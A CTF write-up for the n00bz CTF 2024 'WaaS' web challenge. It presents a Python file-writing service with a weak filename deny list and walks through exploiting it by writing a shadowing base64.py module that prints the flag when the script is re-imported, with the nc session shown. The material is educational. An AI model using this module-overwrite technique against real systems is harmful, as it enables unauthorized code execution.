---
title: WaaS
author: bytebrew
layout: writeup
category: n00bz-CTF-2024
chall_description: 
points: 491
solves: 78
tags: web
date: 2024-08-04
comments: false
---
Writing as a Service! Author: NoobMaster + NoobHacker
---
# Code Analysis
```py
import subprocess
from base64 import b64decode as d
while True:
	print("[1] Write to a file\n[2] Get the flag\n[3] Exit")
	try:
		inp = int(input("Choice: ").strip())
	except:
		print("Invalid input!")
		exit(0)
	if inp == 1:
		file = input("Enter file name: ").strip()
		assert file.count('.') <= 2 # Why do you need more?
		assert "/proc" not in file # Why do you need to write there?
		assert "/bin" not in file # Why do you need to write there? 
		assert "\n" not in file # Why do you need these?
		assert "chall" not in file # Don't be overwriting my files!
		try: 
			f = open(file,'w')
		except:
			print("Error! Maybe the file does not exist?")

		f.write(input("Data: ").strip())
		f.close()
		print("Data written sucessfully!")
		
	if inp == 2:
		flag = subprocess.run(["cat","fake_flag.txt"],capture_output=True) # You actually thought I would give the flag?
		print(flag.stdout.strip())
```
This python code allows you to write to a file, it seems that it can be in the current directory or a directory specified by the user. We can't write to the challenge file, but we can write to a file that will be imported by the challenge script.
# The Exploit
First, we specify base64.py as the file to write to, because when we relaunch the script base64.py will be imported at executed.
```
h@DESKTOP-4SP1R3J ~> nc challs.n00bzunit3d.xyz 10001
[1] Write to a file
[2] Get the flag
[3] Exit
Choice: 1
Enter file name: base64.py
```
Next, we'll write "print(open('flag.txt').read())" to the file. Since the code doesn't except newlines, this will have to do.
```
Data: print(open('flag.txt').read())
Data written sucessfully!
```
Afterwards, we exit:
```
[1] Write to a file
[2] Get the flag
[3] Exit
Choice: ^C⏎
```
Then we will reconnect (which leads to the script being relaunched):
```
h@DESKTOP-4SP1R3J ~> nc challs.n00bzunit3d.xyz 10001
n00bz{0v3rwr1t1ng_py7h0n3_m0dul3s?!!!_168720a41375}
```
Wow! That's a flag!⏎                                                                                               
